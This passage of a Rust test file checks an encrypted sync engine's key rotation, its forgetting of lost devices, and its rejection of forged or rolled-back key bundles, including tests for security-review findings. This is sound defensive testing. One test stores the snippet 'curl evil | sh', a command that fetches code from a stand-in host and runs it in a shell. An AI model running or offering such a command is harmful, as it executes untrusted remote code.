            .sync_set_options(SyncOptions {
                remember_key: false,
            })
            .await
            .expect("options");
        let s = Device {
            engine: restart(&s, &sim),
            ..s
        };
        forget(&a, vec![id_of(&l)], STRONG, STRONG_2).await;
        if old_passphrase_first {
            let status = unlock(&s, STRONG).await.expect("previous keys");
            assert_eq!(alert(&status), Some(AlertKind::KeysRotatedElsewhere));
        }
        let _ = unlock(&s, STRONG_2).await;
        let _ = s.engine.sync_now().await;
        let held = s.engine.sync_revoked_values().await.expect("held");
        let from_l = held
            .iter()
            .find(|item| matches!(&item.subject, SyncSubject::Snippet { .. }))
            .expect("L's snippet held");
        if old_passphrase_first {
            assert!(
                from_l
                    .device
                    .as_deref()
                    .is_some_and(|d| d.starts_with("Lost ("))
            );
        } else {
            assert_eq!(from_l.device, None, "unknown origin");
        }
        sync(&a).await;
        assert!(
            a.engine
                .snippets()
                .await
                .expect("s")
                .iter()
                .all(|sn| sn.name != "From L"),
            "old_passphrase_first={old_passphrase_first}"
        );
        // Keeping it publishes it as S's own value: an explicit gesture.
        s.engine
            .sync_revoked_value(
                from_l.key.clone(),
                crate::sync::api::RevokedValueChoice::KeepAsMine,
            )
            .await
            .expect("keep");
        sync(&s).await;
        sync(&a).await;
        assert!(
            a.engine
                .snippets()
                .await
                .expect("s")
                .iter()
                .any(|sn| sn.name == "From L")
        );
    }
}

// ── Named tests of the review table (§13.11), each on its own ─────────────

struct Forgotten {
    _dir: tempfile::TempDir,
    folder: PathBuf,
    sim: SimFolder,
    a: Device,
    b: Device,
    s: Device,
    /// The bundle of epoch N, as L kept it.
    epoch_n: String,
    /// What L can open of epoch N (passphrase P2, its data key).
    l_n: bundle::OpenedBundle,
}

/// A, B, L, S at N (passphrase changed once in N: P → P2); A forgets L
/// (P3); B adopts; S stays at N.
async fn forgotten_setup() -> Forgotten {
    let (dir, folder, sim) = shared();
    let a = device(&sim);
    let b = device(&sim);
    let l = device(&sim);
    let s = device(&sim);
    create(&a, &folder).await;
    join_named(&b, &folder, "Desk", STRONG).await;
    join_named(&l, &folder, "Lost", STRONG).await;
    join_named(&s, &folder, "Stale", STRONG).await;
    for device in [&a, &b, &l, &s] {
        sync(device).await;
    }
    a.engine
        .sync_change_passphrase(secret(STRONG), typed(STRONG_2))
        .await
        .expect("change");
    for device in [&b, &l, &s] {
        sync(device).await;
        device.engine.sync_acknowledge_alerts().await.expect("ack");
    }
    let epoch_n = folder_bundle(&sim);
    let l_n = bundle::open(&epoch_n, &secret(STRONG_2), &KdfBounds::TEST).expect("L opens N");
    forget(&a, vec![id_of(&l)], STRONG_2, STRONG_3).await;
    unlock(&b, STRONG_3).await.expect("B adopts");
    Forgotten {
        _dir: dir,
        folder,
        sim,
        a,
        b,
        s,
        epoch_n,
        l_n,
    }
}

fn l_rotation(l_n: &bundle::OpenedBundle, passphrase: &str) -> (String, bundle::OpenedBundle) {
    bundle::rotate(
        l_n,
        &typed(passphrase),
        l_n.roster.clone(),
        KdfBounds::TEST_PARAMS,
        &KdfBounds::TEST,
    )
    .expect("L rotates")
}

#[tokio::test]
async fn forged_rotation_with_old_passphrase_is_never_adopted() {
    let f = forgotten_setup().await;
    let (forged, forged_opened) = l_rotation(&f.l_n, STRONG_2);
    let (forged_2, _) = l_rotation(&forged_opened, STRONG_2);
    for text in [forged, forged_2] {
        put_file(&f.sim, "bundle.toml", text.into_bytes());
        // At N + 1: an authentic fork from N, never adopted (E2 names L).
        for device in [&f.a, &f.b] {
            assert_eq!(
                code(device.engine.sync_now().await),
                "sync_rotation_conflict"
            );
            let refused = device
                .engine
                .sync_resolve_rotation_conflict(RotationChoice::UseOther(secret(STRONG_2)))
                .await
                .expect_err("refused");
            assert_eq!(refused.summary().code, "sync_rotation_conflict");
            assert_eq!(epoch_of(device), 2);
        }
        // At N: the old passphrase is in S's history.
        assert_eq!(code(f.s.engine.sync_now().await), "sync_keys_rotated");
        assert_eq!(code(unlock(&f.s, STRONG_2).await), "sync_passphrase_reused");
        assert_eq!(epoch_of(&f.s), 1);
    }
}

#[tokio::test]
async fn forged_jump_with_old_passphrase_is_never_adopted() {
    let f = forgotten_setup().await;
    let genuine = folder_bundle(&f.sim);
    let clear = bundle::peek(&genuine).expect("peek");
    // Authentic links copied, then a link L cannot prove, then its own.
    let mut links = clear.links.clone();
    links.push(bundle::LineageLink {
        epoch: 2,
        digest: clear.commit.expect("v2"),
        proof: [9; 32],
    });
    links.push(random_link(3));
    let keys = vec![
        (1, crate::sync::crypto::KeyBytes::of(&f.l_n.keys.rotate)),
        (2, random_key()),
        (3, random_key()),
    ];
    let (jump, _) = bundle::tests::forge(
        clear.bundle_id,
        4,
        1,
        f.l_n.roster.clone(),
        links,
        keys,
        None,
        STRONG_2,
    );
    put_file(&f.sim, "bundle.toml", jump.clone().into_bytes());
    // B: a link from its own C_E with a false proof: rewritten.
    assert_eq!(code(f.b.engine.sync_now().await), "sync_bundle_tampered");
    assert_eq!(folder_epoch(&f.sim), 2);
    // S: the file opens under P2 but its chain does not verify.
    put_file(&f.sim, "bundle.toml", jump.into_bytes());
    let error = unlock(&f.s, STRONG_2).await.expect_err("never adopted");
    assert!(
        ["sync_bundle_tampered", "sync_passphrase_reused"].contains(&error.summary().code.as_str()),
        "{error:?}"
    );
    assert_eq!(epoch_of(&f.s), 1);
}

#[tokio::test]
async fn old_passphrase_from_earlier_keyset_generation_is_refused_on_adoption() {
    let f = forgotten_setup().await;
    // L rotates from N under P, the passphrase of N's first generation.
    let (forged, _) = l_rotation(&f.l_n, STRONG);
    put_file(&f.sim, "bundle.toml", forged.into_bytes());
    assert_eq!(code(f.s.engine.sync_now().await), "sync_keys_rotated");
    assert_eq!(code(unlock(&f.s, STRONG).await), "sync_passphrase_reused");
    assert_eq!(epoch_of(&f.s), 1);
}

#[tokio::test]
async fn restored_old_bundle_never_makes_a_device_publish_under_old_dk() {
    let f = forgotten_setup().await;
    let genuine = folder_bundle(&f.sim);
    let mark = log_len(&f.sim);
    // Current device: rewrites it.
    put_file(&f.sim, "bundle.toml", f.epoch_n.clone().into_bytes());
    assert_eq!(code(f.a.engine.sync_now().await), "sync_rollback");
    assert_eq!(folder_bundle(&f.sim), genuine);
    // Two processes: A's other process, fresh memory.
    put_file(&f.sim, "bundle.toml", f.epoch_n.clone().into_bytes());
    assert_eq!(
        code(restart(&f.a, &f.sim).sync_now().await),
        "sync_rollback"
    );
    // "Don't remember" + the old passphrase: below the floor, refused.
    f.b.engine
        .sync_set_options(SyncOptions {
            remember_key: false,
        })
        .await
        .expect("options");
    put_file(&f.sim, "bundle.toml", f.epoch_n.clone().into_bytes());
    let b_locked = restart(&f.b, &f.sim);
    assert_eq!(
        b_locked
            .sync_unlock(secret(STRONG_2))
            .await
            .expect_err("floor")
            .summary()
            .code,
        "sync_rollback"
    );
    // Crash after step 5 of a rotation, the old bundle put back meanwhile.
    put_file(&f.sim, "bundle.toml", genuine.clone().into_bytes());
    let crashing = restart_crashing(&f.a, &f.sim, crate::sync::runner::CrashPoint::AfterReplica);
    let _ = crashing
        .sync_rotate_keys(RotateKeys {
            authorization: RotateAuth::CurrentPassphrase(secret(STRONG_3)),
            new_passphrase: typed(STRONG_4),
            remember_key: true,
        })
        .await;
    put_file(&f.sim, "bundle.toml", f.epoch_n.clone().into_bytes());
    let restarted = restart(&f.a, &f.sim);
    let _ = restarted.sync_now().await;
    let _ = restarted.sync_now().await;
    assert_eq!(epoch_of(&f.a), 3);
    assert_eq!(folder_epoch(&f.sim), 3);
    // The device still at N stops on the newer snapshot headers.
    put_file(&f.sim, "bundle.toml", f.epoch_n.clone().into_bytes());
    assert_eq!(code(f.s.engine.sync_now().await), "sync_keys_rotated");
    // A new device never joins it.
    let newcomer = device(&f.sim);
    let refused = newcomer
        .engine
        .sync_join_preview(SyncJoin {
            folder: f.folder.clone(),
            passphrase: secret(STRONG_2),
            device_name: "New".into(),
            remember_key: true,
        })
        .await
        .expect_err("refused");
    assert_eq!(refused.summary().code, "sync_rollback");
    // Nobody published under epoch N.
    for (key, epoch) in snapshot_epochs_since(&f.sim, mark) {
        assert!(epoch >= 2, "{key} published under epoch {epoch}");
    }
}

// ── S2a security review fixes (agent-security, on 8f3bf96..4764938) ───────

/// MOYEN-1: taking the other lineage's keys at the same epoch applies the
/// same provenance rule as an adoption (R3).
#[tokio::test]
async fn use_other_same_epoch_holds_forgotten_writes() {
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    let c = device(&sim);
    let l = device(&sim);
    create(&a, &folder).await;
    join_named(&c, &folder, "Cee", STRONG).await;
    join_named(&l, &folder, "Lost", STRONG).await;
    for d in [&a, &c, &l, &a, &c] {
        sync(d).await;
    }
    // L writes; C merges it; A never sees it before forgetting L.
    let l_previous = sim
        .with(|st| st.files.get(&snap_key(&l)).cloned())
        .expect("l");
    l.engine
        .save_snippet(snippet("From L", "curl evil | sh"))
        .await
        .expect("s");
    sync(&l).await;
    sync(&c).await;
    let l_new = sim
        .with(|st| st.files.get(&snap_key(&l)).cloned())
        .expect("l");
    put_file(&sim, &snap_key(&l), l_previous);
    let old = folder_bundle(&sim);
    let c_previous = sim
        .with(|st| st.files.get(&snap_key(&c)).cloned())
        .expect("c");
    forget(&a, vec![id_of(&l)], STRONG, STRONG_2).await;
    // C rotates concurrently (it does not see A's rotation yet).
    let a_bundle = folder_bundle(&sim);
    let a_snap = take_file(&sim, &snap_key(&a));
    put_file(&sim, "bundle.toml", old.into_bytes());
    put_file(&sim, &snap_key(&c), c_previous);
    put_file(&sim, &snap_key(&l), l_new);
    rotate(&c, STRONG, STRONG_3).await;
    put_file(&sim, &snap_key(&a), a_snap);
    put_file(&sim, "bundle.toml", a_bundle.into_bytes());
    assert_eq!(code(c.engine.sync_now().await), "sync_rotation_conflict");
    c.engine
        .sync_resolve_rotation_conflict(RotationChoice::UseOther(secret(STRONG_2)))
        .await
        .expect("use A's keys");
    let held = c.engine.sync_revoked_values().await.expect("held");
    assert!(
        held.iter().any(|item| item
            .device
            .as_deref()
            .is_some_and(|d| d.starts_with("Lost ("))),
        "{held:?}"
    );
    c.engine
        .save_snippet(snippet("C after", "true"))
        .await
        .expect("s");
    sync(&c).await;
    sync(&a).await;
    let status = sync(&a).await;
    assert!(
        !matches!(
            status,
            SyncStatus::Alert {
                kind: AlertKind::RevokedWrites,
                ..
            } | SyncStatus::Waiting {
                reason: WaitReason::Deferred,
                ..
            }
        ),
        "{status:?}"
    );
    let names: BTreeSet<String> = a
        .engine
        .snippets()
        .await
        .expect("s")
        .into_iter()
        .map(|s| s.name)
        .collect();
    assert!(names.contains("C after"), "{names:?}");
    assert!(!names.contains("From L"), "never laundered: {names:?}");
}

/// MOYEN-2: a "don't remember" device stays unlocked from one pass to the
/// next (its first commitment, a re-join).
#[tokio::test]
async fn dont_remember_stays_unlocked_across_passes() {
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    let b = device(&sim);
    a.engine
        .sync_create(SyncCreate {
            folder: folder.clone(),
            passphrase: typed(STRONG),
            device_name: "Laptop".into(),
            remember_key: false,
        })
        .await
        .expect("create");
    let preview = b
        .engine
        .sync_join_preview(SyncJoin {
            folder: folder.clone(),
            passphrase: secret(STRONG),
            device_name: "Desktop".into(),
            remember_key: false,
        })
        .await
        .expect("preview");
    b.engine
        .sync_join_commit(preview.token, JoinBulkChoice::ReviewEach)
        .await
        .expect("join");
    for device in [&a, &b] {
        for _ in 0..2 {
            let status = sync(device).await;
            assert!(matches!(status, SyncStatus::Idle { .. }), "{status:?}");
        }
    }
    // A re-join (unreadable replica: a new id) keeps it unlocked too.
    let before = id_of(&b);
    std::fs::write(b.paths.sync_dir().join("replica.snap"), b"torn").expect("w");
    let _ = b.engine.sync_now().await;
    assert_ne!(id_of(&b), before, "re-joined");
    for _ in 0..2 {
        let status = sync(&b).await;
        assert!(matches!(status, SyncStatus::Idle { .. }), "{status:?}");
    }
}

/// FAIBLE-1: "don't remember" also forgets the key of a pending rotation.
#[tokio::test]
async fn dont_remember_during_pending_rotation_leaves_no_key() {
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    let b = device(&sim);
    create(&a, &folder).await;
    join(&b, &folder, JoinBulkChoice::ReviewEach).await;
    let bundle = bundle_id(&a);
    sim.with(|st| st.fail_writes.push(("bundle.toml".to_owned(), false)));
    let outcome = rotate(&a, STRONG, STRONG_2).await;
    assert!(matches!(
        outcome.status,
        SyncStatus::Waiting {
            reason: WaitReason::RotationPending,
            ..
        }
    ));
    a.engine
        .sync_set_options(SyncOptions {
            remember_key: false,
        })
        .await
        .expect("options");
    assert!(!has_key(&a, &bundle, 2), "the next key is forgotten too");
    assert!(!has_key(&a, &bundle, 1));
    // The transition still completes with the keys in memory.
    let _ = a.engine.sync_now().await;
    assert_eq!(epoch_of(&a), 2);
    assert!(!has_key(&a, &bundle, 2));
    let restarted = restart(&a, &sim);
    assert_eq!(
        restarted
            .sync_now()
            .await
            .expect_err("locked")
            .summary()
            .code,
        "sync_locked"
    );
}

/// FAIBLE-2: after a re-join of unknown origin, nobody waits for the
/// former id forever.
#[tokio::test]
async fn unknown_origin_rejoin_leaves_no_ghost_waiting() {
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    let s = device(&sim);
    create(&a, &folder).await;
    join_named(&s, &folder, "Stale", STRONG).await;
    sync(&a).await;
    sync(&s).await;
    let former = id_of(&s);
    s.engine
        .sync_set_options(SyncOptions {
            remember_key: false,
        })
        .await
        .expect("options");
    let s = Device {
        engine: restart(&s, &sim),
        ..s
    };
    rotate(&a, STRONG, STRONG_2).await;
    let _ = unlock(&s, STRONG_2).await;
    assert_ne!(id_of(&s), former, "re-joined (no previous key)");
    for _ in 0..2 {
        let _ = s.engine.sync_now().await;
        let _ = a.engine.sync_now().await;
    }
    for device in [&a, &s] {
        let status = sync(device).await;
        assert!(
            matches!(status, SyncStatus::Idle { .. }),
            "{status:?} a={} s={} former={former} files={:?}",
            id_of(&a),
            id_of(&s),
            sim.with(|st| st.files.keys().cloned().collect::<Vec<_>>())
        );
    }
    let text = folder_bundle(&sim);
    let opened = bundle::open(&text, &secret(STRONG_2), &KdfBounds::TEST).expect("open");
    assert!(
        opened
            .roster
            .revoked
            .iter()
            .any(|entry| entry.id.to_string() == former),
        "the former id is retired"
    );
    assert!(sim.with(|st| !st.files.contains_key(&format!("devices/{former}.snap"))));
}

/// FAIBLE-3: a same-epoch file nobody of this lineage could write is what
/// "restore" is for.
#[tokio::test]
async fn restore_bundle_overwrites_unauthenticated_same_epoch_file() {
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    create(&a, &folder).await;
    rotate(&a, STRONG, STRONG_2).await;
    let genuine = folder_bundle(&sim);
    let clear = bundle::peek(&genuine).expect("peek");
    // Same epoch, another commitment, links nobody can prove.
    let (forged, _) = bundle::tests::forge(
        clear.bundle_id,
        2,
        9,
        bundle::Roster::default(),
        vec![random_link(1)],
        vec![(1, random_key())],
        None,
        STRONG,
    );
    put_file(&sim, "bundle.toml", forged.into_bytes());
    assert_eq!(code(a.engine.sync_now().await), "sync_bundle_tampered");
    a.engine.sync_restore_bundle().await.expect("restore");
    assert_eq!(folder_bundle(&sim), genuine);
}

/// FAIBLE-3: a newer file forged from a pending transition's own lineage
/// is rewritten, and the transition completes.
#[tokio::test]
async fn pending_transition_survives_forged_higher_epoch_bundle() {
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    create(&a, &folder).await;
    let id_bytes = bundle::peek(&folder_bundle(&sim)).expect("p").bundle_id;
    sim.with(|st| st.fail_writes.push(("bundle.toml".into(), false)));
    rotate(&a, STRONG, STRONG_2).await;
    let next = std::fs::read_to_string(a.paths.sync_dir().join("bundle.next")).expect("next");
    let next_clear = bundle::peek(&next).expect("peek");
    // Epoch 3 with a link from the pending epoch's commitment and a
    // false proof.
    let mut links = next_clear.links.clone();
    links.push(bundle::LineageLink {
        epoch: 2,
        digest: next_clear.commit.expect("v2"),
        proof: [4; 32],
    });
    let (forged, _) = bundle::tests::forge(
        id_bytes,
        3,
        1,
        bundle::Roster::default(),
        links,
        vec![(1, random_key()), (2, random_key())],
        None,
        STRONG,
    );
    put_file(&sim, "bundle.toml", forged.into_bytes());
    let _ = a.engine.sync_now().await;
    assert_eq!(epoch_of(&a), 2, "the transition completed");
    assert_eq!(folder_epoch(&sim), 2, "the forged file was rewritten");
}

/// FAIBLE-3: an authentic fork at N + 2 is never restored over, even when
/// the status does not show the conflict yet.
#[tokio::test]
async fn restore_refused_for_an_authentic_fork_even_when_idle() {
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    create(&a, &folder).await;
    let epoch_n = folder_bundle(&sim);
    rotate(&a, STRONG, STRONG_2).await;
    assert!(!matches!(sync(&a).await, SyncStatus::Alert { .. }));
    // Another holder of DK_N rotates twice from N (a fork at N + 2).
    let n = bundle::open(&epoch_n, &secret(STRONG), &KdfBounds::TEST).expect("open");
    let (_, fork_1) = bundle::rotate(
        &n,
        &typed(STRONG_3),
        n.roster.clone(),
        KdfBounds::TEST_PARAMS,
        &KdfBounds::TEST,
    )
    .expect("fork 1");
    let (fork_2, _) = bundle::rotate(
        &fork_1,
        &typed(STRONG_4),
        n.roster.clone(),
        KdfBounds::TEST_PARAMS,
        &KdfBounds::TEST,
    )
    .expect("fork 2");
    put_file(&sim, "bundle.toml", fork_2.clone().into_bytes());
    let error = a.engine.sync_restore_bundle().await.expect_err("refused");
    assert_eq!(error.summary().code, "sync_rotation_conflict");
    assert_eq!(folder_bundle(&sim), fork_2);
}

/// FAIBLE-4: the other keys never take the floor lower, and the choices
/// need a current conflict.
#[tokio::test]
async fn use_other_never_lowers_the_floor() {
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    let c = device(&sim);
    create(&a, &folder).await;
    join(&c, &folder, JoinBulkChoice::ReviewEach).await;
    // A's rotation waits; C's lands: a conflict at epoch 2.
    sim.with(|st| st.fail_writes.push(("bundle.toml".into(), false)));
    rotate(&a, STRONG, STRONG_2).await;
    rotate(&c, STRONG, STRONG_3).await;
    assert_eq!(code(a.engine.sync_now().await), "sync_rotation_conflict");
    // A keeps its keys (epoch 3), and that write waits too: floor 3.
    sim.with(|st| st.fail_writes.push(("bundle.toml".into(), false)));
    let status = a
        .engine
        .sync_resolve_rotation_conflict(RotationChoice::KeepMine {
            new_passphrase: typed(STRONG_4),
            remember_key: true,
        })
        .await
        .expect("keep mine");
    assert!(matches!(
        status,
        SyncStatus::Waiting {
            reason: WaitReason::RotationPending,
            ..
        }
    ));
    // C's epoch-2 file is below A's floor: never taken.
    let error = a
        .engine
        .sync_resolve_rotation_conflict(RotationChoice::UseOther(secret(STRONG_3)))
        .await
        .expect_err("below the floor");
    assert!(
        ["sync_not_pending", "sync_rollback"].contains(&error.summary().code.as_str()),
        "{error:?}"
    );
    let _ = a.engine.sync_now().await;
    assert_eq!(epoch_of(&a), 3);
    assert_eq!(folder_epoch(&sim), 3);
}

#[tokio::test]
async fn keep_mine_refused_without_conflict() {
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    create(&a, &folder).await;
    for choice in [
        RotationChoice::KeepMine {
            new_passphrase: typed(STRONG_2),
            remember_key: true,
        },
        RotationChoice::UseOther(secret(STRONG)),
    ] {
        let error = a
            .engine
            .sync_resolve_rotation_conflict(choice)
            .await
            .expect_err("no conflict");
        assert_eq!(error.summary().code, "sync_not_pending");
    }
    assert_eq!(epoch_of(&a), 1);
    assert_eq!(folder_epoch(&sim), 1);
}

/// FAIBLE-5: the re-join `sync_lineage_unknown` points to never takes a
/// grouped choice, and every local difference waits for a decision.
#[tokio::test]
async fn lineage_unknown_rejoin_holds_every_local_difference() {
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    let b = device(&sim);
    a.engine
        .save_snippet(snippet("Shared", "uptime"))
        .await
        .expect("s");
    create(&a, &folder).await;
    join(&b, &folder, JoinBulkChoice::ReviewEach).await;
    // B loses its record of the current keys and its key.
    b.engine
        .sync_set_options(SyncOptions {
            remember_key: false,
        })
        .await
        .expect("options");
    std::fs::remove_file(b.paths.sync_dir().join("commitment.toml")).expect("rm");
    let b = Device {
        engine: restart(&b, &sim),
        ..b
    };
    rotate(&a, STRONG, STRONG_2).await;
    assert_eq!(code(unlock(&b, STRONG_2).await), "sync_lineage_unknown");
    // As the hint says: turn sync off, join again.
    b.engine
        .sync_disable(DisableOptions::default())
        .await
        .expect("disable");
    b.engine
        .save_snippet(snippet("Only B", "id"))
        .await
        .expect("s");
    let preview = b
        .engine
        .sync_join_preview(SyncJoin {
            folder: folder.clone(),
            passphrase: secret(STRONG_2),
            device_name: "Desktop".into(),
            remember_key: true,
        })
        .await
        .expect("preview");
    assert!(preview.rejoin);
    let refused = b
        .engine
        .sync_join_commit(preview.token, JoinBulkChoice::PreferLocal)
        .await
        .expect_err("grouped choice");
    assert_eq!(refused.summary().code, "sync_resolution_invalid");
    let preview = b
        .engine
        .sync_join_preview(SyncJoin {
            folder: folder.clone(),
            passphrase: secret(STRONG_2),
            device_name: "Desktop".into(),
            remember_key: true,
        })
        .await
        .expect("preview");
    b.engine
        .sync_join_commit(preview.token, JoinBulkChoice::ReviewEach)
        .await
        .expect("join");
    sync(&b).await;
    let held = b.engine.sync_revoked_values().await.expect("held");
    assert_eq!(held.len(), 1, "only the difference waits: {held:?}");
    assert!(held.iter().all(|item| item.device.is_none()));
    sync(&a).await;
    assert!(
        a.engine
            .snippets()
            .await
            .expect("s")
            .iter()
            .all(|s| s.name != "Only B"),
        "not published without a decision"
    );
}

/// FAIBLE-6: the observed `revoked_clock` bounds this pass even when the
/// corrective rewrite fails.
#[tokio::test]
async fn observed_revoked_clock_is_used_even_if_rewrite_fails() {
    let (_dir, folder, sim) = shared();
    let a = device(&sim);
    let b = device(&sim);
    let l = device(&sim);
    create(&a, &folder).await;
    join(&b, &folder, JoinBulkChoice::ReviewEach).await;
    join_named(&l, &folder, "Lost", STRONG).await;
    sync(&a).await;
    let l_id = id_of(&l);
    forget(&a, vec![l_id.clone()], STRONG, STRONG_2).await;
    unlock(&b, STRONG_2).await.expect("adopt");
    let text = folder_bundle(&sim);
    let opened = bundle::open(&text, &secret(STRONG_2), &KdfBounds::TEST).expect("open");
    let bound = opened
        .roster
        .revoked
        .iter()
        .find(|e| e.id.to_string() == l_id)
        .map(|e| e.revoked_clock)
        .expect("forgotten");
    // A key holder raises L's bound in a new revision; A's corrective
    // rewrite then fails.
    let mut roster = opened.roster.clone();
    if let Some(entry) = roster.revoked.iter_mut().find(|e| e.id.to_string() == l_id) {
        entry.revoked_clock = bound + 100;
    }
    let (tampered, _) = bundle::with_roster(&opened, roster).expect("roster");
    put_file(&sim, "bundle.toml", tampered.into_bytes());
    sim.with(|st| st.fail_writes.push(("bundle.toml".into(), false)));
    let b_id = crate::sync::DeviceId::from_hex(&id_of(&b)).expect("id");
    forge_snapshot_as(
        &sim,
        STRONG_2,
        b_id,
        1000,
        50,
        &format!(
            r#"{{"context":{{"{b_id}":50,"{l_id}":{}}},"records":[]}}"#,
            bound + 1
        ),
    );
    let _ = a.engine.sync_now().await;
    let codes = issue_codes(&a.engine.sync_issues().await.expect("issues"));
    assert!(
        codes.contains(&"sync_bundle_tampered".to_owned()),
        "{codes:?}"
    );
    assert!(
        codes.contains(&"sync_revoked_writes".to_owned()),
        "{codes:?}"
    );
}
